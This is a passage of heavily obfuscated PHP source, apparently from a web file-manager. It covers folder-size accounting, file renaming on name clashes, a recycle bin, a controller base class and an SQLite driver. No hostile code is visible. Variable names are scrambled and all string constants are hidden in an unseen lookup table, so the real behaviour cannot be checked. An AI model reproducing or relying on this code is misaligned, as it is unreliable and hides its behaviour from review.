unset(self::$cachePathInfo[$ìØË©[2090] . $ç·ùò™Í]); } public function metaSet($úèäõŞÙ, $ü¦™³– = null, $¤³‹ßÑİ = null) { $ëÈ¥Ÿ»É = parent::metaSet($úèäõŞÙ, $ü¦™³–, $¤³‹ßÑİ); if ($ëÈ¥Ÿ»É) { $this->sourceCacheClear($úèäõŞÙ); } return $ëÈ¥Ÿ»É; } public function pathInfoByPath($¯®Šß‰ø, $’ÊŒê“Ï) { $æèŠùõ =& $_SERVER[ì…™Î¶Ï]; $×¸õ•à = !$’ÊŒê“Ï ? array() : explode($æèŠùõ[8], trim($’ÊŒê“Ï, $æèŠùõ[8])); $³Ù³Ÿ°í = $¯®Šß‰ø; foreach ($×¸õ•à as $Ç·Ê…ÈÕ) { $íª´¯šœ = array($æèŠùõ[489] => $³Ù³Ÿ°í, $æèŠùõ[32] => $Ç·Ê…ÈÕ); $†‘‚»ï° = $this->where($íª´¯šœ)->select(); if (!$†‘‚»ï°) { return !1; } $†‘‚»ï° = array_sort_by($†‘‚»ï°, $æèŠùõ[422]); $³Ù³Ÿ°í = $†‘‚»ï°[0][$æèŠùõ[394]]; } return $this->pathInfo($³Ù³Ÿ°í, !0); } protected function updateModifyTime($å‹èØ„) { $ù…‘„î =& $_SERVER[ì…™Î¶Ï]; $Ã‘ÊƒƒŸ = defined($ù…‘„î[465]) ? USER_ID : $ù…‘„î[190]; if (!$å‹èØ„) { return; } if (!is_array($å‹èØ„)) { $å‹èØ„ = array($å‹èØ„); } foreach ($å‹èØ„ as $„Ÿ™«ÏÔ => $‘ûÛä£Î) { $å‹èØ„[$„Ÿ™«ÏÔ] = intval($‘ûÛä£Î); $this->sourceCacheClear($‘ûÛä£Î); } $¯ÑÍÆÈĞ = array($ù…‘„î[394] => array($ù…‘„î[7], $å‹èØ„)); $Ùğ•·Í = array($ù…‘„î[574] => $Ã‘ÊƒƒŸ, $ù…‘„î[416] => time()); $this->where($¯ÑÍÆÈĞ)->save($Ùğ•·Í); } public function folderSizeReset($¹û¢úñ, $ü´§úæ¤ = false) { $áõ®Ëé =& $_SERVER[ì…™Î¶Ï]; if ($this->statusIgnoreResetSpace) { return; } $ˆ‚´‘° = $this->sourceInfo($¹û¢úñ); $Ööç³Å = $áõ®Ëé[2091] . $¹û¢úñ; CacheLock::lock($Ööç³Å, 20); if ($ü´§úæ¤ === !1) { $this->sourceCacheClear($¹û¢úñ); $ˆ‚´‘° = $this->sourceInfo($¹û¢úñ); $–¬½ö¦Ë = array($áõ®Ëé[393] => $¹û¢úñ, $áõ®Ëé[421] => 0); $™Ã¹ªÂˆ = $this->where($–¬½ö¦Ë)->sum($áõ®Ëé[80]); $ü´§úæ¤ = intval($™Ã¹ªÂˆ) - intval($ˆ‚´‘°[$áõ®Ëé[80]]); } if ($ü´§úæ¤ == 0) { return CacheLock::unlock($Ööç³Å); } $é†³¯±“ = $this->parentLevelArray($ˆ‚´‘°[$áõ®Ëé[512]]); if (!$é†³¯±“) { $é†³¯±“ = array(); } $é†³¯±“[] = $ˆ‚´‘°[$áõ®Ëé[394]]; $–¬½ö¦Ë = array($áõ®Ëé[394] => array($áõ®Ëé[410], $é†³¯±“)); if ($ü´§úæ¤ < 0) { $–¬½ö¦Ë[$áõ®Ëé[80]] = array($áõ®Ëé[991], abs($ü´§úæ¤)); } $this->where($–¬½ö¦Ë)->setAdd($áõ®Ëé[80], $ü´§úæ¤); CacheLock::unlock($Ööç³Å); $³ãµÏÓ = $áõ®Ëé[2092] . $ˆ‚´‘°[$áõ®Ëé[403]] . $áõ®Ëé[4] . $ˆ‚´‘°[$áõ®Ëé[495]]; $ïóÜŒÇŒ = array($ˆ‚´‘°[$áõ®Ëé[403]], $ˆ‚´‘°[$áõ®Ëé[495]]); TaskRun::timeLimitCall($³ãµÏÓ, $áõ®Ëé[2093], $ïóÜŒÇŒ, 1.5); } public function folderSizeResetChildren($š¹«íåÑ) { $˜á­°Ñ =& $_SERVER[ì…™Î¶Ï]; $this->sourceCacheClear($š¹«íåÑ); $ÏÉ’ÑÍ¿ = $this->sourceInfo($š¹«íåÑ); $¥´É÷›‘ = array($˜á­°Ñ[568] => 1, $˜á­°Ñ[572] => $ÏÉ’ÑÍ¿[$˜á­°Ñ[495]], $˜á­°Ñ[575] => array($˜á­°Ñ[535], $ÏÉ’ÑÍ¿[$˜á­°Ñ[512]] . $š¹«íåÑ . $˜á­°Ñ[536])); $¸ûïÃ• = $˜á­°Ñ[2094]; $ÏÁŠ½ò­ = $this->field($¸ûïÃ•)->where($¥´É÷›‘)->select(); $¥´É÷›‘[$˜á­°Ñ[402]] = 0; $ÊŸºŸ…Å = $this->field($¸ûïÃ•)->where($¥´É÷›‘)->select(); if (!$ÊŸºŸ…Å) { return; } $ÏÁŠ½ò­[] = $ÏÉ’ÑÍ¿; $ÏÁŠ½ò­ = array_to_keyvalue($ÏÁŠ½ò­, $˜á­°Ñ[394]); foreach ($ÏÁŠ½ò­ as $Üãô÷¸ => $®€†æ¦Ğ) { $ÏÁŠ½ò­[$Üãô÷¸][$˜á­°Ñ[2095]] = $ÏÁŠ½ò­[$Üãô÷¸][$˜á­°Ñ[80]]; $ÏÁŠ½ò­[$Üãô÷¸][$˜á­°Ñ[80]] = 0; } foreach ($ÊŸºŸ…Å as $®€†æ¦Ğ) { $€Æª¥â = $®€†æ¦Ğ[$˜á­°Ñ[489]] . $˜á­°Ñ[12]; if (!isset($ÏÁŠ½ò­[$€Æª¥â])) { continue; } if ($®€†æ¦Ğ[$˜á­°Ñ[422]] == $ÏÁŠ½ò­[$€Æª¥â][$˜á­°Ñ[422]]) { $ÏÁŠ½ò­[$€Æª¥â][$˜á­°Ñ[80]] += $®€†æ¦Ğ[$˜á­°Ñ[80]]; } } foreach ($ÏÁŠ½ò­ as $®€†æ¦Ğ) { $îÄä¯ÍÚ = $this->parentLevelArray($®€†æ¦Ğ[$˜á­°Ñ[512]]); foreach ($îÄä¯ÍÚ as $€Æª¥â) { $€Æª¥â = $€Æª¥â . $˜á­°Ñ[12]; if (!isset($ÏÁŠ½ò­[$€Æª¥â])) { continue; } if ($®€†æ¦Ğ[$˜á­°Ñ[422]] == $ÏÁŠ½ò­[$€Æª¥â][$˜á­°Ñ[422]]) { $ÏÁŠ½ò­[$€Æª¥â][$˜á­°Ñ[80]] += $®€†æ¦Ğ[$˜á­°Ñ[80]]; } } } $›¤”ÃùŞ = array(); foreach ($ÏÁŠ½ò­ as $®€†æ¦Ğ) { if ($®€†æ¦Ğ[$˜á­°Ñ[80]] == $®€†æ¦Ğ[$˜á­°Ñ[2095]]) { continue; } $›¤”ÃùŞ[] = array($˜á­°Ñ[394], $®€†æ¦Ğ[$˜á­°Ñ[394]], $˜á­°Ñ[80], $®€†æ¦Ğ[$˜á­°Ñ[80]]); } $this->saveAll($›¤”ÃùŞ); } public function userSpaceReset($µù’¹” = false) { $³±İ°„è =& $_SERVER[ì…™Î¶Ï]; $•ô±ï‹ù = $this->where(array($³±İ°„è[403] => self::TYPE_USER, $³±İ°„è[495] => $µù’¹”, $³±İ°„è[402] => 0))->sum($³±İ°„è[80]); $•ô±ï‹ù = !$•ô±ï‹ù || $•ô±ï‹ù <= 0 ? 0 : $•ô±ï‹ù; Model($³±İ°„è[504])->userEdit($µù’¹”, array($³±İ°„è[1788] => $•ô±ï‹ù)); } public function targetSpaceUpdate($ØÕóÊã, $öıÛñ¯ø) { $µ×·‘Ö =& $_SERVER[ì…™Î¶Ï]; if (!$öıÛñ¯ø) { return; } if (!in_array($ØÕóÊã, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $š™šåÍ« = $this->targetSpaceSize($ØÕóÊã, $öıÛñ¯ø); if ($ØÕóÊã == self::TYPE_USER) { Model($µ×·‘Ö[504])->userEdit($öıÛñ¯ø, array($µ×·‘Ö[1788] => $š™šåÍ«)); } else { if ($ØÕóÊã == self::TYPE_GROUP) { Model($µ×·‘Ö[513])->groupEdit($öıÛñ¯ø, array($µ×·‘Ö[1788] => $š™šåÍ«)); } } } public function targetSpaceSize($ªİĞô…, $üı¡€ş‰) { $Èá‹›äƒ =& $_SERVER[ì…™Î¶Ï]; $íÃ´ê†  = $this->sourceRoot($ªİĞô…, $üı¡€ş‰, !0); if (!$íÃ´ê† ) { return 0; } $³²ËÖÊ = floatval($íÃ´ê† [$Èá‹›äƒ[80]]); $úÁÜ¦ôæ = array($Èá‹›äƒ[575] => array($Èá‹›äƒ[535], $Èá‹›äƒ[522] . $íÃ´ê† [$Èá‹›äƒ[394]] . $Èá‹›äƒ[536])); $şîşâ¿ì = Model($Èá‹›äƒ[420])->field($Èá‹›äƒ[409])->where($úÁÜ¦ôæ)->select(); $şîşâ¿ì = array_to_keyvalue($şîşâ¿ì, $Èá‹›äƒ[12], $Èá‹›äƒ[394]); $şîşâ¿ì = array_unique(array_filter($şîşâ¿ì)); if ($şîşâ¿ì) { $úÁÜ¦ôæ = array($Èá‹›äƒ[409] => array($Èá‹›äƒ[410], $şîşâ¿ì)); $³²ËÖÊ += floatval($this->where($úÁÜ¦ôæ)->sum($Èá‹›äƒ[80])); } $³²ËÖÊ = !$³²ËÖÊ || $³²ËÖÊ <= 0 ? 0 : $³²ËÖÊ; return $³²ËÖÊ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ÍÒ˜€–‚) { return $this->fileTypeProfile($ÍÒ˜€–‚, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ãıÎ²ƒ›) { return $this->fileTypeProfile($ãıÎ²ƒ›, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ì—Îƒ’Ü, $¹»Úµ ) { $¨É¦´ÌÑ =& $_SERVER[ì…™Î¶Ï]; $ƒø›ãÂ“ = $¨É¦´ÌÑ[2096] . $ì—Îƒ’Ü . $¨É¦´ÌÑ[11] . $¹»Úµ ; $¯Õâğ¿Ô = Cache::get($ƒø›ãÂ“); if ($¯Õâğ¿Ô) { return $¯Õâğ¿Ô; } $Û÷İÅ¶Ò = array($¨É¦´ÌÑ[568] => 0); if ($ì—Îƒ’Ü != !1) { $Û÷İÅ¶Ò[$¨É¦´ÌÑ[495]] = $ì—Îƒ’Ü; $Û÷İÅ¶Ò[$¨É¦´ÌÑ[403]] = $¹»Úµ ; } $¤´ë°«ƒ = array(); $¤´ë°«ƒ[$¨É¦´ÌÑ[2097]] = array($¨É¦´ÌÑ[2098] => LNG($¨É¦´ÌÑ[2097]), $¨É¦´ÌÑ[2099] => $this->where($Û÷İÅ¶Ò)->count(), $¨É¦´ÌÑ[570] => $this->where($Û÷İÅ¶Ò)->sum($¨É¦´ÌÑ[80])); $Ğ´òÕ„‡ = KodIO::fileTypeList(); foreach ($Ğ´òÕ„‡ as $ûßŸÌ¯¹ => $‹›ÕãáÊ) { $Û÷İÅ¶Ò[$¨É¦´ÌÑ[404]] = $this->fileTypeWhere($ûßŸÌ¯¹); $¤´ë°«ƒ[$ûßŸÌ¯¹] = array($¨É¦´ÌÑ[2098] => $‹›ÕãáÊ[$¨É¦´ÌÑ[32]], $¨É¦´ÌÑ[2099] => $this->where($Û÷İÅ¶Ò)->count(), $¨É¦´ÌÑ[570] => $this->where($Û÷İÅ¶Ò)->sum($¨É¦´ÌÑ[80])); } Cache::set($ƒø›ãÂ“, $¤´ë°«ƒ, 1200); return $¤´ë°«ƒ; } public function fileNameExist($²†·…’¹, $ù¶ö³éŸ) { $×ß¦¾¨Â =& $_SERVER[ì…™Î¶Ï]; $ÒÂŠ´¨‘ = $this->where(array($×ß¦¾¨Â[489] => $²†·…’¹, $×ß¦¾¨Â[32] => $ù¶ö³éŸ, $×ß¦¾¨Â[422] => 0))->find(); return is_array($ÒÂŠ´¨‘) ? $ÒÂŠ´¨‘[$×ß¦¾¨Â[394]] : !1; } public function childList($¤„™†²å) { $š®Äç¬¦ =& $_SERVER[ì…™Î¶Ï]; $¿ç¡ÓšŒ = $š®Äç¬¦[2074] . $¤„™†²å; if (isset(self::$cacheChildList[$¿ç¡ÓšŒ])) { return self::$cacheChildList[$¿ç¡ÓšŒ]; } $µşêÂäª = array($š®Äç¬¦[489] => intval($¤„™†²å), $š®Äç¬¦[422] => 0); $£¼„úÛğ = $this->where($µşêÂäª)->select(); $£¼„úÛğ = $£¼„úÛğ ? $£¼„úÛğ : array(); self::$cacheChildList[$¿ç¡ÓšŒ] = $£¼„úÛğ; foreach ($£¼„úÛğ as $ùÂô°¼ê) { $¿ç¡ÓšŒ = $š®Äç¬¦[449] . $ùÂô°¼ê[$š®Äç¬¦[394]]; self::$cacheSourceInfo[$¿ç¡ÓšŒ] = $ùÂô°¼ê; } return $£¼„úÛğ; } public function fileNameAuto($ì¶šíÉ, $Ãš¿„îö, $õÕªó» = REPEAT_RENAME, $õß£°‘˜ = false) { $ßù¾¹Èê =& $_SERVER[ì…™Î¶Ï]; $âì‚“è = array($ßù¾¹Èê[489] => $ì¶šíÉ, $ßù¾¹Èê[422] => 0, $ßù¾¹Èê[32] => array($ßù¾¹Èê[378], $Ãš¿„îö . $ßù¾¹Èê[379])); $ÈªÆ¶œ¡ = $this->field($ßù¾¹Èê[32])->where($âì‚“è)->select(); $©Õè¯» = array_to_keyvalue($ÈªÆ¶œ¡, $ßù¾¹Èê[12], $ßù¾¹Èê[32]); return $this->fileNameAutoGet($©Õè¯», $Ãš¿„îö, $õÕªó», $õß£°‘˜); } public function fileNameAutoGet($Ë·¾Êœ, $é‘ÍÉæÕ, $²ŠòÕŸ, $£²Àœ„ú) { $à“¨–Ê¤ =& $_SERVER[ì…™Î¶Ï]; if ($²ŠòÕŸ == REPEAT_REPLACE || !$Ë·¾Êœ || !in_array_not_case($é‘ÍÉæÕ, $Ë·¾Êœ) || $£²Àœ„ú && $²ŠòÕŸ != REPEAT_RENAME_FOLDER) { return $é‘ÍÉæÕ; } if ($²ŠòÕŸ == REPEAT_SKIP) { return !1; } $„ëºªìŞ = $à“¨–Ê¤[10] . get_path_ext($é‘ÍÉæÕ); $„ëºªìŞ = $„ëºªìŞ == $à“¨–Ê¤[10] || $£²Àœ„ú ? $à“¨–Ê¤[12] : $„ëºªìŞ; for ($¼ÛÚÀú§ = 1; $¼ÛÚÀú§ <= count($Ë·¾Êœ) + 1; $¼ÛÚÀú§++) { $³Ó‚šòµ = substr($é‘ÍÉæÕ, 0, strlen($é‘ÍÉæÕ) - strlen($„ëºªìŞ)); $ëÚ¤å½¨ = $³Ó‚šòµ . "\x28{$¼ÛÚÀú§}\51{$„ëºªìŞ}"; if (!in_array_not_case($ëÚ¤å½¨, $Ë·¾Êœ)) { return $ëÚ¤å½¨; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\x63\x65\137\162\x65\143\171\143\154\145"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\124\x69\155\x65", "\164\x69\x6d\x65", "\x69\x6e\163\145\x72\164", "\146\165\x6e\x63\x74\151\157\x6e")); public function listData($èÊ™ô« = false) { $½ı¦Ïæá =& $_SERVER[ì…™Î¶Ï]; $èÊ™ô« = $èÊ™ô« ? $èÊ™ô« : USER_ID; $û ÍÛª = $this->where(array($½ı¦Ïæá[1622] => $èÊ™ô«))->select(); return array_to_keyvalue($û ÍÛª, $½ı¦Ïæá[12], $½ı¦Ïæá[394]); } public function moveToRecycle($Êø²§‹¡) { $©¡šÛ¹‡ =& $_SERVER[ì…™Î¶Ï]; $ÚíÊÒğÍ = Model($©¡šÛ¹‡[1301]); $¥“»õšŸ = $ÚíÊÒğÍ->sourceInfo($Êø²§‹¡); if (!$¥“»õšŸ || $¥“»õšŸ[$©¡šÛ¹‡[422]] == $©¡šÛ¹‡[89]) { return; } $‘ø‚åøÅ = array($©¡šÛ¹‡[409] => $Êø²§‹¡, $©¡šÛ¹‡[1622] => USER_ID, $©¡šÛ¹‡[571] => $¥“»õšŸ[$©¡šÛ¹‡[403]], $©¡šÛ¹‡[572] => $¥“»õšŸ[$©¡šÛ¹‡[495]], $©¡šÛ¹‡[575] => $¥“»õšŸ[$©¡šÛ¹‡[512]]); $this->add($‘ø‚åøÅ); $this->recycleMove($Êø²§‹¡, 1); if ($¥“»õšŸ[$©¡šÛ¹‡[402]] == $©¡šÛ¹‡[89]) { $È­Õ•÷Ö = array($©¡šÛ¹‡[575] => array($©¡šÛ¹‡[535], $¥“»õšŸ[$©¡šÛ¹‡[512]] . $Êø²§‹¡ . $©¡šÛ¹‡[536])); $ÚíÊÒğÍ->where($È­Õ•÷Ö)->setField($©¡šÛ¹‡[422], 1); } } public function clear() { $this->remove(!1); } public function remove($à¸Øìå× = false, $’·µ³Ê = false) { $ô½°é¾¥ =& $_SERVER[ì…™Î¶Ï]; $’·µ³Ê = $’·µ³Ê ? $’·µ³Ê : USER_ID; $åÃÔ‡”ù = Model($ô½°é¾¥[1301]); $ÂÓĞ¥œ = $this->listData($’·µ³Ê); $à¸Øìå× = $à¸Øìå× === !1 ? !1 : $à¸Øìå×; $½åÁŒ€ = array(); foreach ($ÂÓĞ¥œ as $ßİÂ†¯Ğ) { if ($à¸Øìå× != !1 && !in_array($ßİÂ†¯Ğ, $à¸Øìå×)) { continue; } $Ş²¼ŠÓ = $åÃÔ‡”ù->sourceInfo($ßİÂ†¯Ğ); $åÃÔ‡”ù->remove($ßİÂ†¯Ğ, !1); $°­º·§ = $Ş²¼ŠÓ[$ô½°é¾¥[403]] . $ô½°é¾¥[11] . $Ş²¼ŠÓ[$ô½°é¾¥[495]]; $½åÁŒ€[$°­º·§] = array($ô½°é¾¥[571] => $Ş²¼ŠÓ[$ô½°é¾¥[403]], $ô½°é¾¥[495] => $Ş²¼ŠÓ[$ô½°é¾¥[495]]); $this->where(array($ô½°é¾¥[394] => $ßİÂ†¯Ğ))->delete(); } foreach ($½åÁŒ€ as $«áë…Ê) { $åÃÔ‡”ù->targetSpaceUpdate($«áë…Ê[$ô½°é¾¥[403]], $«áë…Ê[$ô½°é¾¥[495]]); } } public function restore($îçˆÅ = false) { $ß¹ì›ï  = $this->listData(); $this->_restoreSource($ß¹ì›ï , $îçˆÅ); } public function removeUserAll($¬ùŞ”ù¾) { $this->remove(!1, $¬ùŞ”ù¾); } private function _restoreSource($Ù²Ò°¦á, $»Âê‘³Ç) { $‘ù«İ¯ =& $_SERVER[ì…™Î¶Ï]; $šÀ±›° = Model($‘ù«İ¯[1301]); $»Âê‘³Ç = $»Âê‘³Ç == !1 ? !1 : $»Âê‘³Ç; if (!$Ù²Ò°¦á) { return !0; } $‚Ã²º¦ = array(); foreach ($Ù²Ò°¦á as $è‚ÔŞã) { if ($»Âê‘³Ç != !1 && !in_array($è‚ÔŞã, $»Âê‘³Ç)) { continue; } $ğ¬œŠõ = $šÀ±›°->sourceInfo($è‚ÔŞã); $éÊêÙª° = $šÀ±›°->sourceInfo($ğ¬œŠõ[$‘ù«İ¯[489]]); if ($éÊêÙª°[$‘ù«İ¯[422]] == $‘ù«İ¯[89]) { continue; } $šÀ±›°->lockMoveStart($è‚ÔŞã); $this->recycleMove($è‚ÔŞã, 0); if ($ğ¬œŠõ[$‘ù«İ¯[402]] == $‘ù«İ¯[89]) { $ñ£«¸µ = array($‘ù«İ¯[575] => array($‘ù«İ¯[535], $ğ¬œŠõ[$‘ù«İ¯[512]] . $è‚ÔŞã . $‘ù«İ¯[536])); $šÀ±›°->where($ñ£«¸µ)->setField($‘ù«İ¯[422], 0); $this->restoreFolderChildren($è‚ÔŞã, $Ù²Ò°¦á); } $this->where(array($‘ù«İ¯[394] => $è‚ÔŞã))->delete(); $šÀ±›°->folderSizeReset($ğ¬œŠõ[$‘ù«İ¯[489]]); $‚Ã²º¦[] = $ğ¬œŠõ[$‘ù«İ¯[489]]; if ($ğ¬œŠõ[$‘ù«İ¯[402]] == $‘ù«İ¯[89]) { $‚Ã²º¦[] = $è‚ÔŞã; } $šÀ±›°->lockMoveEnd($è‚ÔŞã); } $šÀ±›°->updateModifyTime($‚Ã²º¦); } private function restoreFolderChildren($‘ÌÀªª¥, $„“‘ŸÒ‰) { $‚¤ö ­á =& $_SERVER[ì…™Î¶Ï]; $ûŸ¯³öÓ = Model($‚¤ö ­á[1301]); $Á÷ÏÀ«¡ = array($‚¤ö ­á[394] => array($‚¤ö ­á[7], array())); foreach ($„“‘ŸÒ‰ as $µÑ¦¶§ø) { if ($µÑ¦¶§ø == $‘ÌÀªª¥) { continue; } if (!$ûŸ¯³öÓ->isParentOf($‘ÌÀªª¥, $µÑ¦¶§ø)) { continue; } $Á¥—©…ã = $ûŸ¯³öÓ->sourceInfo($µÑ¦¶§ø); if ($Á¥—©…ã[$‚¤ö ­á[402]] == $‚¤ö ­á[89]) { $Á÷ÏÀ«¡[] = array($‚¤ö ­á[575] => array($‚¤ö ­á[535], $Á¥—©…ã[$‚¤ö ­á[512]] . $µÑ¦¶§ø . $‚¤ö ­á[536])); } else { $Á÷ÏÀ«¡[$‚¤ö ­á[394]][1][] = $µÑ¦¶§ø; } } if (!$Á÷ÏÀ«¡[$‚¤ö ­á[394]][1]) { unset($Á÷ÏÀ«¡[$‚¤ö ­á[394]]); } if (!$Á÷ÏÀ«¡) { return; } $Á÷ÏÀ«¡[$‚¤ö ­á[394]][1] = array_unique($Á÷ÏÀ«¡[$‚¤ö ­á[394]][1]); $Á÷ÏÀ«¡[$‚¤ö ­á[976]] = $‚¤ö ­á[1894]; $ûŸ¯³öÓ->where($Á÷ÏÀ«¡)->setField($‚¤ö ­á[422], 1); } private function recycleMove($÷¤«‘öÒ, $ÎÓ›ÑÇç = 1) { $ó¢Æ‰Äå =& $_SERVER[ì…™Î¶Ï]; $òƒ®Ê½€ = Model($ó¢Æ‰Äå[1301]); $×²â¯”¯ = Model($ó¢Æ‰Äå[2100]); $ãÎÑï»€ = array($ó¢Æ‰Äå[394] => $÷¤«‘öÒ); if ($ÎÓ›ÑÇç) { $òƒ®Ê½€->where($ãÎÑï»€)->setField($ó¢Æ‰Äå[422], 1); $×²â¯”¯->eventRecycle($÷¤«‘öÒ, $ó¢Æ‰Äå[2101]); } else { $»–ÉÌÄ¢ = $òƒ®Ê½€->where($ãÎÑï»€)->find(); $‚‚ó•ÇÃ = $»–ÉÌÄ¢[$ó¢Æ‰Äå[402]] == $ó¢Æ‰Äå[89]; $¥¤Ÿ—÷ó = $òƒ®Ê½€->fileNameAuto($»–ÉÌÄ¢[$ó¢Æ‰Äå[489]], $»–ÉÌÄ¢[$ó¢Æ‰Äå[32]], REPEAT_RENAME_FOLDER, $‚‚ó•ÇÃ); if ($¥¤Ÿ—÷ó != $»–ÉÌÄ¢[$ó¢Æ‰Äå[32]]) { $òƒ®Ê½€->rename($÷¤«‘öÒ, $¥¤Ÿ—÷ó); } $òƒ®Ê½€->where($ãÎÑï»€)->setField($ó¢Æ‰Äå[422], 0); $×²â¯”¯->eventRecycle($÷¤«‘öÒ, $ó¢Æ‰Äå[2102]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\x73\x6f\x75\162\143\145\123\145\143\162\145\x74\114\x69\163\164"; public $field = array("\x73\157\165\162\x63\145\111\104", "\164\x79\x70\x65\111\x44", "\143\162\x65\x61\164\145\125\x73\x65\x72"); } goto C¿Ë°‘‘»ß; BĞ±ŒÏ¸³½: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $şÍ«èÚÃ =& $_SERVER[ì…™Î¶Ï]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$şÍ«èÚÃ[6]] =& $config; $this->values[$şÍ«èÚÃ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $şÍ«èÚÃ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($âîöÆ) { if (1 === func_num_args()) { $this->{$âîöÆ} = new $âîöÆ(); } else { $¤²Ì´‹ = new ReflectionClass($âîöÆ); $Ùˆ›Ì = func_get_args(); array_shift($Ùˆ›Ì); $this->{$âîöÆ} = $¤²Ì´‹->newInstanceArgs($Ùˆ›Ì); } return $this->{$âîöÆ}; } public function routeBind($¿‚µÉúŒ, $²Á¿‰û, $®Úå‡³ˆ = 3) { $ø˜ä¡½‹ =& $_SERVER[ì…™Î¶Ï]; $Šµç’éï = $this->in[$ø˜ä¡½‹[9]]; $¿‚µÉúŒ = str_replace($ø˜ä¡½‹[10], $ø˜ä¡½‹[11], trim(trim($¿‚µÉúŒ, $ø˜ä¡½‹[8]), $ø˜ä¡½‹[12])); if (!$¿‚µÉúŒ || count($Šµç’éï) <= $®Úå‡³ˆ) { return !1; } $øÚúªÊ¿ = !0; $øÈ°õ¨¬ = explode($ø˜ä¡½‹[8], $¿‚µÉúŒ); for ($å§³ÛöÅ = 0; $å§³ÛöÅ < count($øÈ°õ¨¬); $å§³ÛöÅ++) { if ($øÈ°õ¨¬[$å§³ÛöÅ] != $Šµç’éï[$®Úå‡³ˆ + $å§³ÛöÅ]) { $øÚúªÊ¿ = !1; break; } } if (!$øÚúªÊ¿) { return; } call_user_func_array(array($this, $²Á¿‰û), array()); } public function routeArgs($Û·ç¡›ò = 3) { $™æâ¢³è = $this->in[$_SERVER[ì…™Î¶Ï][9]]; if (count($™æâ¢³è) <= $Û·ç¡›ò) { return array(); } $çœ «¨¡ = array(); for ($ÑÒ¨—Öá = $Û·ç¡›ò; $ÑÒ¨—Öá < count($™æâ¢³è); $ÑÒ¨—Öá += 2) { $çœ «¨¡[$™æâ¢³è[$ÑÒ¨—Öá]] = $™æâ¢³è[$ÑÒ¨—Öá + 1]; $this->in[$™æâ¢³è[$ÑÒ¨—Öá]] = $™æâ¢³è[$ÑÒ¨—Öá + 1]; } return $çœ «¨¡; } protected function assign($½Áµõê, $±âÓîĞº) { $this->values[$½Áµõê] = $±âÓîĞº; } protected function display($÷¦îšÓ·) { ob_end_clean(); extract($this->values); require $this->tpl . $÷¦îšÓ·; } } class DbSqliteBase extends Db { public function __construct($÷şš–…‰ = '') { $ŞˆĞ…‚¹ =& $_SERVER[ì…™Î¶Ï]; if (!extension_loaded($ŞˆĞ…‚¹[13])) { think_exception(think_lang($ŞˆĞ…‚¹[14]) . $ŞˆĞ…‚¹[15]); } if (!empty($÷şš–…‰)) { if (!isset($÷şš–…‰[$ŞˆĞ…‚¹[16]])) { $÷şš–…‰[$ŞˆĞ…‚¹[16]] = 438; } $this->config = $÷şš–…‰; if (empty($this->config[$ŞˆĞ…‚¹[17]])) { $this->config[$ŞˆĞ…‚¹[17]] = array(); } } } public function connect($’şÙ·ò‹ = '', $‚ì²óóØ = 0) { $ªœ–£é² =& $_SERVER[ì…™Î¶Ï]; if (!isset($this->linkID[$‚ì²óóØ])) { if (empty($’şÙ·ò‹)) { $’şÙ·ò‹ = $this->config; } $œäÅ¸Ñ = !empty($’şÙ·ò‹[$ªœ–£é²[17]][$ªœ–£é²[18]]) ? $’şÙ·ò‹[$ªœ–£é²[17]][$ªœ–£é²[18]] : $this->pconnect; $íÈÃâë = $œäÅ¸Ñ ? $ªœ–£é²[19] : $ªœ–£é²[20]; $this->linkID[$‚ì²óóØ] = $íÈÃâë($’şÙ·ò‹[$ªœ–£é²[21]], $’şÙ·ò‹[$ªœ–£é²[16]]); if (!$this->linkID[$‚ì²óóØ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$‚ì²óóØ], 30000); if (1 != think_config($ªœ–£é²[22])) { unset($this->config); } } return $this->linkID[$‚ì²óóØ]; } public function free() { $this->queryID = null; } public function query($†¯áæ¾ø) { $’Şê¦­“ =& $_SERVER[ì…™Î¶Ï]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $†¯áæ¾ø; if ($this->queryID) { $this->free(); } think_action_status($’Şê¦­“[23], 1); think_status($’Şê¦­“[24]); $this->queryID = sqlite_query($this->_linkID, $†¯áæ¾ø); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ŒÎ‡öªÀ = $this->getAll(); return $ŒÎ‡öªÀ; } } public function execute($…‹ÚÚÙ») { $ÃéåÑ‹š =& $_SERVER[ì…™Î¶Ï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $…‹ÚÚÙ»; if ($this->queryID) { $this->free(); } think_action_status($ÃéåÑ‹š[25], 1); think_status($ÃéåÑ‹š[24]); $µõ”€á• = sqlite_exec($this->_linkID, $…‹ÚÚÙ»); $this->debug(); if (!1 === $µõ”€á•) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ì…™Î¶Ï][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ü”¬¾ˆ = sqlite_query($this->_linkID, $_SERVER[ì…™Î¶Ï][27]); if (!$Ü”¬¾ˆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ˆæÒî = sqlite_query($this->_linkID, $_SERVER[ì…™Î¶Ï][28]); if (!$ˆæÒî) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ßÍÙ’© = array(); if ($this->numRows > 0) { for ($­Ò•‹Ø = 0; $­Ò•‹Ø < $this->numRows; $­Ò•‹Ø++) { $ßÍÙ’©[$­Ò•‹Ø] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ßÍÙ’©; } public function getFields($ƒª£ğ£˜) { $äæ®éãğ =& $_SERVER[ì…™Î¶Ï]; 